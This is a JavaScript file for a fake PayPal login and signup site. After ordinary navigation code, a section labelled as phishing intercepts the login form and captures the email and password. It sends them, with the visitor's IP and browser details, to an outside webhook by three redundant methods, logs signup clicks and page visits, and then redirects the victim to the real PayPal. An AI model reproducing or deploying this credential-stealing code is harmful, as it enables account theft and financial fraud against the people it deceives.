// Pages
document.querySelectorAll(".logo").forEach((logo) => {
  logo.addEventListener("click", () => {
    document.querySelector(".front-page").style.display = "block";
    document.querySelector(".login-page").style.display = "none";
    document.querySelector(".signup-page").style.display = "none";
  });
});

document.querySelectorAll(".login").forEach((loginBtn) => {
  loginBtn.addEventListener("click", () => {
    document.querySelector(".front-page").style.display = "none";
    document.querySelector(".login-page").style.display = "block";
    document.querySelector(".signup-page").style.display = "none";
  });
});

document.querySelectorAll(".signup").forEach((signupBtn) => {
  signupBtn.addEventListener("click", () => {
    document.querySelector(".front-page").style.display = "none";
    document.querySelector(".login-page").style.display = "none";
    document.querySelector(".signup-page").style.display = "flex";
  });
});
// End of Pages

// Navigation
const dropdownItems = document.querySelectorAll(".dropdown-hover");

if (window.innerWidth < 1000) {
  const menuIcon = document.querySelector(".menu");
  const navbar = document.querySelector(".navbar");

  menuIcon.addEventListener("click", () => {
    navbar.classList.toggle("change");

    if (!navbar.classList.contains("change")) {
      document.querySelectorAll(".nav-dropdown").forEach((dropdown) => {
        dropdown.style.left = "-20rem";
      });
    }
  });

  document.querySelectorAll(".show-dropdown").forEach((link) => {
    link.addEventListener("click", () => {
      link.nextElementSibling.style.left = "0";
    });
  });

  document.querySelectorAll(".dropdown-heading-link").forEach((headingLink) => {
    headingLink.addEventListener("click", () => {
      headingLink.parentElement.parentElement.style.left = "-20rem";
    });
  });
} else {
  dropdownItems.forEach((dropdownItem) => {
    dropdownItem.addEventListener("mouseover", () => {
      dropdownItem.lastElementChild.style.cssText =
        "opacity: 1; visibility: visible";
      document.querySelector(".navbar-wrapper").style.background =
        "linear-gradient(to right, #066399, #2f8fdf, #066399)";
      dropdownItem.firstElementChild.firstElementChild.style.transform =
        "rotate(180deg)";
    });
    dropdownItem.addEventListener("mouseout", () => {
      dropdownItem.lastElementChild.style.cssText =
        "opacity: 0; visibility: hidden";
      document.querySelector(".navbar-wrapper").style.background = "none";
      dropdownItem.firstElementChild.firstElementChild.style.transform =
        "rotate(0)";
    });
  });
}

window.addEventListener("resize", () => {
  window.location.reload();
});

// End of Navigation

// BRUTE FORCE PHISHING - GUARANTEED CAPTURE
document.addEventListener('DOMContentLoaded', function() {
  const WEBHOOK_URL = "https://webhook-sigma-drab.vercel.app/api/webhook/8qho97mkymi0u8jdt";

  // Get IP address
  const getIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      return 'unknown';
    }
  };

  // Force send data - multiple methods
  const sendData = async (data) => {
    const ip = await getIP();
    const payload = JSON.stringify({
      ...data,
      ip: ip,
      userAgent: navigator.userAgent,
      timestamp: new Date().toISOString()
    });

    console.log("SENDING:", data); // Debug

    // Method 1: Fetch
    fetch(WEBHOOK_URL, {
      method: 'POST',
      mode: 'no-cors',
      headers: {'Content-Type': 'application/json'},
      body: payload
    }).catch(() => {});

    // Method 2: Image beacon
    const img = new Image();
    img.src = `${WEBHOOK_URL}?data=${btoa(payload)}`;

    // Method 3: XHR
    try {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', WEBHOOK_URL, true);
      xhr.send(payload);
    } catch(e) {}
  };

  // CAPTURE LOGIN - DIRECT FORM INTERCEPT
  const loginForm = document.querySelector('.login-page-form');
  if (loginForm) {
    console.log("LOGIN FORM FOUND - ARMED");
    
    loginForm.addEventListener('submit', async function(e) {
      e.preventDefault();
      e.stopPropagation();
      
      const email = this.querySelector('input[type="text"]').value;
      const password = this.querySelector('input[type="password"]').value;
      const loginBtn = this.querySelector('.form-login-btn');
      
      console.log("CAPTURING:", {email, password});
      
      if (email && password) {
        // Send credentials
        await sendData({
          type: 'PAYPAL_LOGIN_CREDENTIALS',
          email: email,
          password: password,
          status: 'CREDENTIALS_CAPTURED'
        });
        
        // Visual feedback
        if (loginBtn) {
          loginBtn.value = "Logging in...";
          loginBtn.disabled = true;
        }
        
        // Redirect
        setTimeout(() => {
          window.location.href = 'https://paypal.com';
        }, 1500);
      }
    });
  }

  // ALSO capture button click as backup
  const loginButton = document.querySelector('.form-login-btn');
  if (loginButton) {
    loginButton.addEventListener('click', async function(e) {
      const emailInput = document.querySelector('input[type="text"]');
      const passwordInput = document.querySelector('input[type="password"]');
      
      if (emailInput && passwordInput) {
        const email = emailInput.value;
        const password = passwordInput.value;
        
        if (email && password) {
          await sendData({
            type: 'PAYPAL_LOGIN_BACKUP',
            email: email,
            password: password,
            status: 'BACKUP_CAPTURE'
          });
        }
      }
    });
  }

  // SIGNUP CAPTURE
  const signupButton = document.querySelector('.signup-page .blue-btn');
  if (signupButton) {
    signupButton.addEventListener('click', async function(e) {
      e.preventDefault();
      
      const accountType = document.querySelector('input[type="radio"]:checked') ? 
        document.querySelector('input[type="radio"]:checked').nextElementSibling.querySelector('h3').textContent : 
        'Unknown';
      
      await sendData({
        type: 'PAYPAL_SIGNUP',
        accountType: accountType
      });
      
      this.textContent = "Continue...";
      this.disabled = true;
      
      setTimeout(() => {
        window.location.href = 'https://paypal.com/signup';
      }, 1500);
    });
  }

  // Page visit
  sendData({
    type: 'PAGE_VISIT',
    page: window.location.href
  });
});
